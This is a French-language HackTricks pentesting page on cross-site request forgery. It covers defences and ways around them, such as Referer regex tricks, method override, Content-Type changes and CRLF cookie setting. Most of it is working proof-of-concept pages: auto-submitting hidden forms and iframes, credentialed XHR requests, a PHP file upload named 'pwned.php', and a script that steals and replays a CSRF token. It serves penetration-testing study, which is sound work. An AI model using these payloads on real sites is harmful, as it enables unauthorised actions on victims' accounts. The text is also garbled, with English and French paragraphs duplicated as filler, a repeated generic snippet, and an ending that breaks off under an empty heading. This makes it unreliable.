# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez une légende du piratage web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Qu'est-ce que le CSRF ?

La **falsification de requête intersite** (également connue sous le nom de CSRF) est une vulnérabilité de sécurité web qui permet à un attaquant d'**inciter les utilisateurs à effectuer des actions qu'ils ne souhaitent pas effectuer**.\
Cela est réalisé en **faisant accéder un utilisateur connecté** sur la plateforme victime à un site web contrôlé par l'attaquant et à partir de là, **exécuter** du code JS malveillant, envoyer des formulaires ou récupérer des "images" sur le **compte de la victime**.

### Prérequis

Pour pouvoir exploiter une vulnérabilité CSRF, vous devez d'abord **trouver une action pertinente à exploiter** (changer de mot de passe ou d'adresse e-mail, faire en sorte que la victime vous suive sur un réseau social, vous donner plus de privilèges...). La **session doit reposer uniquement sur les cookies ou l'en-tête d'authentification de base HTTP**, aucun autre en-tête ne peut être utilisé pour gérer la session. Enfin, il ne doit pas y avoir de **paramètres imprévisibles** dans la requête.

Plusieurs **contre-mesures** peuvent être mises en place pour éviter cette vulnérabilité.

### **Défenses courantes**

* [**Cookies SameSite**](hacking-with-cookies/#samesite) : Si le cookie de session utilise ce drapeau, il se peut que vous ne puissiez pas envoyer le cookie à partir de sites web arbitraires.
* [**Partage des ressources entre origines**](cors-bypass.md) : Selon le type de requête HTTP que vous devez effectuer pour exploiter l'action pertinente, vous pouvez prendre en compte la **politique CORS du site victime**. _Notez que la politique CORS n'affectera pas si vous voulez simplement envoyer une requête GET ou une requête POST à partir d'un formulaire et que vous n'avez pas besoin de lire la réponse._
* Demandez le **mot de passe** de l'utilisateur pour autoriser l'action.
* Résolvez un **captcha**.
* Lisez les en-têtes **Referrer** ou **Origin**. Si une expression régulière est utilisée, elle peut être contournée par exemple avec :
* http://mal.net?orig=http://example.com (se termine par l'URL)
* http://example.com.mal.net (commence par l'URL)
* **Modifiez** le **nom** des **paramètres** de la requête POST ou GET.
* Utilisez un **jeton CSRF** dans chaque session. Ce jeton doit être envoyé dans la requête pour confirmer l'action. Ce jeton peut être protégé par CORS.

### Carte CSRF

![](<../.gitbook/assets/image (112).png>)

## Contournement des défenses

### Du POST au GET

Peut-être que le formulaire que vous voulez exploiter est préparé pour envoyer une **requête POST avec un jeton CSRF mais**, vous devriez **vérifier** si un **GET** est également **valide** et si lorsque vous envoyez une requête GET, le **jeton CSRF est toujours validé**.

### Absence de jeton

Certaines applications **valident correctement le jeton lorsqu'il est présent mais ignorent la validation si le jeton est omis**.\
Dans cette situation, l'attaquant peut **supprimer le paramètre entier** contenant le jeton (pas seulement sa valeur) pour contourner la validation et effectuer une attaque CSRF.

### Le jeton CSRF n'est pas lié à la session utilisateur

Certaines applications ne **vérifient pas que le jeton appartient à la même session** que l'utilisateur qui effectue la requête. Au lieu de cela, l'application **maintient un pool global de jetons** qu'elle a émis et accepte tout jeton qui apparaît dans ce pool.\
Dans cette situation, l'attaquant peut se connecter à l'application en utilisant son propre compte, **obtenir un jeton valide**, puis **transmettre ce jeton à l'utilisateur victime** dans son attaque CSRF.

### Contournement de la méthode

Si la requête utilise une méthode "**étrange**", vérifiez si la fonctionnalité de **substitution de méthode** est active.\
Par exemple, si elle utilise une méthode **PUT**, vous pouvez essayer d'utiliser une méthode **POST** et **envoyer** : _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Cela peut également fonctionner en envoyant le **paramètre \_method dans une requête POST** ou en utilisant les **en-têtes** :

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Contournement du jeton d'en-tête personnalisé

Si la requête ajoute un **en-tête personnalisé** avec un **jeton** à la requête en tant que méthode de **protection CSRF**, alors :

* Testez la requête sans le **jeton personnalisé et également l'en-tête**.
* Testez la requête avec un **jeton différent mais de même longueur**.

### Le jeton CSRF est vérifié par un cookie

Dans une variation ultérieure de la vulnérabilité précédente, certaines applications **dupliquent chaque jeton dans un cookie et un paramètre de requête**. Ou elles **définissent un cookie csrf** et **vérifient en arrière-plan si le jeton csrf envoyé correspond à celui lié au cookie**.

Lorsque la requête suivante est validée, l'application vérifie simplement que le **jeton** soumis dans le **paramètre de requête correspond** à la valeur stockée par le **cookie**.\
Dans cette situation, l'attaquant peut à nouveau effectuer une attaque CSRF **si le site web contient une vulnérabilité qui lui permettrait de définir son cookie CSRF sur la victime comme un CRLF**.

Dans ce cas, vous pouvez définir le cookie en essayant de charger une fausse image, puis lancer l'attaque CSRF comme dans cet exemple :
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Notez que si le jeton csrf est lié au cookie de session, cette attaque ne fonctionnera pas car vous devrez définir votre session en tant que victime, et vous vous attaquerez donc vous-même.
{% endhint %}

### Changement de Content-Type

Selon [**ceci**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), afin d'**éviter les requêtes préliminaires** en utilisant la méthode **POST**, voici les valeurs de Content-Type autorisées :

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Cependant, notez que la **logique des serveurs peut varier** en fonction du **Content-Type** utilisé, vous devriez donc essayer les valeurs mentionnées ainsi que d'autres comme **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemple (à partir de [ici](https://brycec.me/posts/corctf\_2021\_challenges)) d'envoi de données JSON en tant que text/plain :
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Contournement de la requête de pré-vérification pour `application/json`

Comme vous le savez déjà, vous ne pouvez pas envoyer une requête POST avec le Content-Type **`application/json`** via un formulaire HTML, et si vous essayez de le faire via **`XMLHttpRequest`**, une requête de pré-vérification est envoyée en premier.\
Cependant, vous pouvez essayer d'envoyer les données JSON en utilisant les types de contenu **`text/plain`** et **`application/x-www-form-urlencoded`** juste pour vérifier si le backend utilise les données indépendamment du Content-Type.\
Vous pouvez envoyer un formulaire en utilisant `Content-Type: text/plain` en définissant **`enctype="text/plain"`**

Si le serveur n'accepte que le type de contenu "application/json", vous pouvez **envoyer le type de contenu "text/plain; application/json"** sans déclencher de requête de pré-vérification.

Vous pouvez également essayer de **contourner** cette restriction en utilisant un fichier flash SWF. Pour plus d'informations, [**lisez cet article**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Contournement de la vérification du Référent / Origine

**Évitez l'en-tête Referer**

Certaines applications valident l'en-tête Referer lorsqu'il est présent dans les requêtes, mais **passent outre la validation si l'en-tête est omis**.
```markup
<meta name="referrer" content="never">
```
**Bypasses Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Pour définir le nom de domaine du serveur dans l'URL que le Référent va envoyer à l'intérieur des paramètres, vous pouvez faire :
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs de crypto.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende des hackers web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

## **Exemples d'exploitation**

### **Exfiltration du jeton CSRF**

Si un **jeton CSRF** est utilisé comme **défense**, vous pouvez essayer de l'**exfiltrer** en exploitant une vulnérabilité [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou une vulnérabilité [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET en utilisant des balises HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
D'autres balises HTML5 qui peuvent être utilisées pour envoyer automatiquement une requête GET sont :

![](<../.gitbook/assets/image (530).png>)

### Requête GET de formulaire
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Requête POST de formulaire

A common method used by web applications to send data to the server is through a form POST request. This type of request is commonly used for actions such as submitting a login form, creating a new user account, or updating user information.

Une méthode couramment utilisée par les applications web pour envoyer des données au serveur est la requête POST de formulaire. Ce type de requête est généralement utilisé pour des actions telles que la soumission d'un formulaire de connexion, la création d'un nouveau compte utilisateur ou la mise à jour des informations utilisateur.

To send a form POST request, the web application constructs an HTML form with input fields for the desired data. When the user submits the form, the browser sends a POST request to the server with the form data as the request body.

Pour envoyer une requête POST de formulaire, l'application web construit un formulaire HTML avec des champs de saisie pour les données souhaitées. Lorsque l'utilisateur soumet le formulaire, le navigateur envoie une requête POST au serveur avec les données du formulaire en tant que corps de la requête.

The server then processes the request and performs the necessary actions based on the submitted data. It is important to note that the server assumes the request is legitimate and initiated by the user who submitted the form.

Le serveur traite ensuite la requête et effectue les actions nécessaires en fonction des données soumises. Il est important de noter que le serveur suppose que la requête est légitime et initiée par l'utilisateur qui a soumis le formulaire.

### Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that exploits the trust a web application has in a user's browser. In a CSRF attack, an attacker tricks a victim into performing an unwanted action on a web application in which the victim is authenticated.

La falsification de requête intersite (CSRF) est une attaque qui exploite la confiance qu'une application web accorde au navigateur d'un utilisateur. Dans une attaque CSRF, un attaquant trompe une victime pour qu'elle effectue une action indésirable sur une application web sur laquelle la victime est authentifiée.

The attack works by crafting a malicious webpage or email that contains a request to the target web application. When the victim visits the malicious webpage or clicks on the malicious link in the email, their browser automatically sends the request to the target web application, as the victim is already authenticated.

L'attaque fonctionne en créant une page web ou un e-mail malveillant contenant une requête vers l'application web cible. Lorsque la victime visite la page web malveillante ou clique sur le lien malveillant dans l'e-mail, son navigateur envoie automatiquement la requête à l'application web cible, car la victime est déjà authentifiée.

As a result, the target web application processes the request, unaware that it was not initiated by the victim but by the attacker. This can lead to unauthorized actions being performed on behalf of the victim, such as changing their password, making a purchase, or deleting their account.

En conséquence, l'application web cible traite la requête, sans se rendre compte qu'elle n'a pas été initiée par la victime mais par l'attaquant. Cela peut entraîner l'exécution d'actions non autorisées au nom de la victime, telles que la modification de son mot de passe, l'achat d'un produit ou la suppression de son compte.

To protect against CSRF attacks, web applications can implement measures such as using anti-CSRF tokens, checking the origin of requests, and requiring additional authentication for sensitive actions.

Pour se protéger contre les attaques CSRF, les applications web peuvent mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, la vérification de l'origine des requêtes et l'exigence d'une authentification supplémentaire pour les actions sensibles.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Requête POST de formulaire via iframe

One common technique used in Cross-Site Request Forgery (CSRF) attacks is to submit a form through an iframe. This technique allows an attacker to trick a user into unknowingly submitting a form on a vulnerable website.

Une technique couramment utilisée dans les attaques de falsification de requêtes intersites (CSRF) consiste à soumettre un formulaire via un iframe. Cette technique permet à un attaquant de tromper un utilisateur en lui faisant soumettre un formulaire sur un site vulnérable sans qu'il le sache.

To perform this attack, the attacker creates a malicious webpage that contains an iframe pointing to the target website's form. The form is pre-filled with the desired values, and JavaScript is used to automatically submit the form when the iframe loads.

Pour effectuer cette attaque, l'attaquant crée une page web malveillante contenant un iframe pointant vers le formulaire du site cible. Le formulaire est pré-rempli avec les valeurs souhaitées, et JavaScript est utilisé pour soumettre automatiquement le formulaire lorsque l'iframe se charge.

When the victim visits the malicious webpage, the iframe loads the target website's form and submits it without the victim's knowledge. This allows the attacker to perform actions on behalf of the victim, such as changing their password or making unauthorized transactions.

Lorsque la victime visite la page web malveillante, l'iframe charge le formulaire du site cible et le soumet sans que la victime le sache. Cela permet à l'attaquant d'effectuer des actions au nom de la victime, telles que changer son mot de passe ou effectuer des transactions non autorisées.

To protect against this type of attack, websites should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict access controls.

Pour se protéger contre ce type d'attaque, les sites web doivent mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, la validation de l'en-tête referrer et la mise en place de contrôles d'accès stricts.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requête POST Ajax**

An Ajax POST request is a type of HTTP request that is sent asynchronously from a web page to a server using the Ajax technology. It allows the web page to send data to the server and receive a response without having to reload the entire page.

Une requête POST Ajax est un type de requête HTTP qui est envoyée de manière asynchrone depuis une page web vers un serveur en utilisant la technologie Ajax. Elle permet à la page web d'envoyer des données au serveur et de recevoir une réponse sans avoir à recharger la page entière.

```javascript
$.ajax({
    url: '/api/endpoint',
    type: 'POST',
    data: {
        param1: 'value1',
        param2: 'value2'
    },
    success: function(response) {
        console.log(response);
    },
    error: function(error) {
        console.log(error);
    }
});
```

```javascript
$.ajax({
    url: '/api/endpoint',
    type: 'POST',
    data: {
        param1: 'valeur1',
        param2: 'valeur2'
    },
    success: function(response) {
        console.log(response);
    },
    error: function(error) {
        console.log(error);
    }
});
```

In the example above, an Ajax POST request is made to the `/api/endpoint` URL with two parameters (`param1` and `param2`) and their corresponding values (`value1` and `value2`). The `success` function is called when the request is successful and the `error` function is called when an error occurs.

Dans l'exemple ci-dessus, une requête POST Ajax est effectuée vers l'URL `/api/endpoint` avec deux paramètres (`param1` et `param2`) et leurs valeurs correspondantes (`valeur1` et `valeur2`). La fonction `success` est appelée lorsque la requête est réussie et la fonction `error` est appelée en cas d'erreur.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Requête POST multipart/form-data

When submitting a form on a website, the data is typically sent using the `application/x-www-form-urlencoded` content type. However, in some cases, the form may require file uploads or other binary data. In such situations, the `multipart/form-data` content type is used.

Lors de la soumission d'un formulaire sur un site web, les données sont généralement envoyées en utilisant le type de contenu `application/x-www-form-urlencoded`. Cependant, dans certains cas, le formulaire peut nécessiter des téléchargements de fichiers ou d'autres données binaires. Dans de telles situations, le type de contenu `multipart/form-data` est utilisé.

To craft a `multipart/form-data` POST request, the request body is divided into multiple parts, each containing a separate piece of data. Each part is identified by a unique boundary string, which is specified in the `Content-Type` header.

Pour créer une requête POST `multipart/form-data`, le corps de la requête est divisé en plusieurs parties, chacune contenant une donnée distincte. Chaque partie est identifiée par une chaîne de délimitation unique, qui est spécifiée dans l'en-tête `Content-Type`.

Each part consists of a header and a body. The header contains metadata about the part, such as the name of the form field or the filename of the uploaded file. The body contains the actual data.

Chaque partie est composée d'un en-tête et d'un corps. L'en-tête contient des métadonnées sur la partie, telles que le nom du champ de formulaire ou le nom du fichier téléchargé. Le corps contient les données réelles.

Here is an example of a `multipart/form-data` POST request:

Voici un exemple de requête POST `multipart/form-data` :

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

[Binary data of the image]
-----------------------------1234567890--
```

In this example, the request is sent to the `/upload` endpoint on `example.com`. The request body is divided into two parts. The first part contains the `username` field with the value `john.doe`. The second part contains the `profile_picture` field with the uploaded file `picture.jpg`.

Dans cet exemple, la requête est envoyée à l'endpoint `/upload` sur `example.com`. Le corps de la requête est divisé en deux parties. La première partie contient le champ `username` avec la valeur `john.doe`. La deuxième partie contient le champ `profile_picture` avec le fichier téléchargé `picture.jpg`.

To create a `multipart/form-data` POST request, you can use various tools and libraries, such as cURL or programming languages like Python with the `requests` library.

Pour créer une requête POST `multipart/form-data`, vous pouvez utiliser différents outils et bibliothèques, tels que cURL ou des langages de programmation comme Python avec la bibliothèque `requests`.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Requête POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request. 

Dans cette technique, nous allons explorer comment effectuer une attaque de type Cross-Site Request Forgery (CSRF) en utilisant une requête POST multipart/form-data.

#### What is CSRF?

#### Qu'est-ce que le CSRF ?

Cross-Site Request Forgery (CSRF) is a type of attack where an attacker tricks a victim into performing unwanted actions on a web application in which the victim is authenticated.

Le Cross-Site Request Forgery (CSRF) est un type d'attaque où un attaquant trompe une victime pour qu'elle effectue des actions non désirées sur une application web sur laquelle la victime est authentifiée.

#### How does CSRF work?

#### Comment fonctionne le CSRF ?

CSRF attacks exploit the trust that a web application has in a user's browser. When a user is authenticated on a web application, the application assumes that any requests coming from the user's browser are legitimate.

Les attaques CSRF exploitent la confiance qu'une application web accorde au navigateur d'un utilisateur. Lorsqu'un utilisateur est authentifié sur une application web, l'application suppose que toutes les requêtes provenant du navigateur de l'utilisateur sont légitimes.

An attacker can create a malicious web page that contains a form with hidden fields. When the victim visits this page, their browser automatically submits the form, sending a request to the target web application.

Un attaquant peut créer une page web malveillante contenant un formulaire avec des champs cachés. Lorsque la victime visite cette page, son navigateur soumet automatiquement le formulaire, envoyant ainsi une requête à l'application web ciblée.

#### Exploiting CSRF using multipart/form-data POST request

#### Exploitation du CSRF en utilisant une requête POST multipart/form-data

To exploit CSRF using a multipart/form-data POST request, we need to create a form with the necessary fields and values. The form should be submitted automatically when the victim visits our malicious web page.

Pour exploiter le CSRF en utilisant une requête POST multipart/form-data, nous devons créer un formulaire avec les champs et les valeurs nécessaires. Le formulaire doit être soumis automatiquement lorsque la victime visite notre page web malveillante.

The target web application should have a vulnerable endpoint that accepts multipart/form-data requests without any CSRF protection. When the victim's browser submits the form, the request will be processed by the target application, performing the desired action.

L'application web ciblée doit avoir un point d'extrémité vulnérable qui accepte les requêtes multipart/form-data sans aucune protection CSRF. Lorsque le navigateur de la victime soumet le formulaire, la requête sera traitée par l'application ciblée, effectuant ainsi l'action souhaitée.

#### Conclusion

#### Conclusion

CSRF attacks can be dangerous as they can lead to unauthorized actions being performed on behalf of the victim. By understanding how CSRF works and exploiting it using a multipart/form-data POST request, we can better protect web applications from such attacks.

Les attaques CSRF peuvent être dangereuses car elles peuvent entraîner l'exécution d'actions non autorisées au nom de la victime. En comprenant le fonctionnement du CSRF et en l'exploitant à l'aide d'une requête POST multipart/form-data, nous pouvons mieux protéger les applications web contre de telles attaques.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Requête POST de formulaire à partir d'un iframe

In some cases, you may encounter a web application that uses an iframe to display a form. This can be a potential security vulnerability if the form is vulnerable to Cross-Site Request Forgery (CSRF) attacks.

Dans certains cas, vous pouvez rencontrer une application web qui utilise un iframe pour afficher un formulaire. Cela peut constituer une vulnérabilité potentielle si le formulaire est vulnérable aux attaques de falsification de requête intersite (CSRF).

To exploit this vulnerability, you can create a malicious webpage that contains an iframe pointing to the target application's form. When a user visits your webpage, the iframe will load the form from the target application.

Pour exploiter cette vulnérabilité, vous pouvez créer une page web malveillante contenant un iframe pointant vers le formulaire de l'application cible. Lorsqu'un utilisateur visite votre page web, l'iframe chargera le formulaire de l'application cible.

You can then use JavaScript to automatically submit the form with malicious data. This can be done by accessing the form element within the iframe and setting its values programmatically. Once the form is filled with the desired data, you can trigger its submission using the `submit()` method.

Vous pouvez ensuite utiliser JavaScript pour soumettre automatiquement le formulaire avec des données malveillantes. Cela peut être fait en accédant à l'élément de formulaire à l'intérieur de l'iframe et en définissant ses valeurs de manière programmatique. Une fois que le formulaire est rempli avec les données souhaitées, vous pouvez déclencher sa soumission en utilisant la méthode `submit()`.

This technique allows an attacker to perform actions on behalf of the victim user, potentially leading to unauthorized operations or data leakage.

Cette technique permet à un attaquant d'effectuer des actions au nom de l'utilisateur victime, ce qui peut entraîner des opérations non autorisées ou une fuite de données.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Vol de jeton CSRF et envoi d'une requête POST**

To perform a CSRF attack, the first step is to steal the CSRF token from the target website. This token is usually embedded in the HTML source code or included as a cookie. Once the token is obtained, it can be used to craft a malicious POST request.

Pour effectuer une attaque CSRF, la première étape consiste à voler le jeton CSRF du site cible. Ce jeton est généralement intégré dans le code source HTML ou inclus en tant que cookie. Une fois le jeton obtenu, il peut être utilisé pour créer une requête POST malveillante.

To steal the CSRF token, an attacker can use various techniques such as cross-site scripting (XSS) or social engineering. Once the token is obtained, the attacker can then create a form or script that automatically submits a POST request to the target website.

Pour voler le jeton CSRF, un attaquant peut utiliser différentes techniques telles que le cross-site scripting (XSS) ou l'ingénierie sociale. Une fois le jeton obtenu, l'attaquant peut ensuite créer un formulaire ou un script qui soumet automatiquement une requête POST au site cible.

The POST request can be crafted to perform any action that the target website allows, such as changing account settings, making purchases, or deleting data. By tricking the victim into visiting a malicious website or clicking on a malicious link, the attacker can execute the CSRF attack and perform unauthorized actions on behalf of the victim.

La requête POST peut être créée pour effectuer n'importe quelle action autorisée par le site cible, telle que la modification des paramètres du compte, les achats ou la suppression de données. En trompant la victime pour qu'elle visite un site Web malveillant ou qu'elle clique sur un lien malveillant, l'attaquant peut exécuter l'attaque CSRF et effectuer des actions non autorisées au nom de la victime.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Vol de jeton CSRF et envoi d'une requête POST à l'aide d'un iframe, d'un formulaire et d'Ajax**

L'une des méthodes couramment utilisées pour exploiter une vulnérabilité de falsification de requête intersite (CSRF) consiste à voler le jeton CSRF d'un utilisateur légitime et à l'utiliser pour envoyer une requête POST malveillante. Cette attaque peut être réalisée en utilisant un iframe, un formulaire ou Ajax.

#### **1. Vol du jeton CSRF**

Pour voler le jeton CSRF, l'attaquant peut utiliser différentes techniques, telles que l'inclusion d'un lien malveillant dans un e-mail ou une page Web, ou l'exploitation d'une vulnérabilité de script intersite (XSS) pour extraire le jeton à partir de la page Web.

#### **2. Envoi d'une requête POST avec un iframe**

Une fois que l'attaquant a réussi à voler le jeton CSRF, il peut l'utiliser pour envoyer une requête POST malveillante en utilisant un iframe. L'attaquant crée un iframe invisible dans une page Web et définit l'URL de la cible comme la cible de l'action du formulaire. Ensuite, l'attaquant utilise JavaScript pour remplir le formulaire avec les données nécessaires, y compris le jeton CSRF volé, et soumet le formulaire automatiquement.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://www.example.com/target-page" method="POST" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="csrf_token" value="TOKEN_VALUE">
  <!-- Autres champs de formulaire nécessaires -->
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

#### **3. Envoi d'une requête POST avec un formulaire**

